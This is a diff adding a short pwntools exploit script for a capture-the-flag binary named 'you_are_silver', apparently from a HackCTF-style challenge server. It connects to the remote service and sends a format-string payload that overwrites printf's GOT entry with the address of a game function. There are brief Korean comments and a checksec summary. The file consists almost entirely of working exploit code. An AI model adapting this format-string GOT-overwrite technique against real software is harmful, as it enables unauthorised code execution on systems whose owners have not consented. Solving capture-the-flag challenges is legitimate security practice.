@@ -1,0 +1,46 @@
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+
+
+r = remote("ctf.j0n9hyun.xyz", 3022)
+# r = process("./you_are_silver")
+
+
+
+# lib = ELF("./libc.so.6")
+'''
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+'''
+
+
+printf_got = 0x601028
+play_game = 0x4006d7
+
+
+# FSB
+# 2개로 쪼개서 
+# 일단 
+
+payload  = b""
+payload += b"%9$n"
+payload += b"%%%d"%(play_game)
+payload += b"c%10$n"
+payload  = payload.ljust(0x18, b"\x00")
+payload += p64(printf_got + 4)
+payload += p64(printf_got)
+payload += b"f" * (0x2e-len(payload))
+
+pause()
+r.sendline(payload)
+r.recvuntil("You are challenger.")
+pause()
+
+
+r.interactive()
+
+# printf의 got => play_game 
+
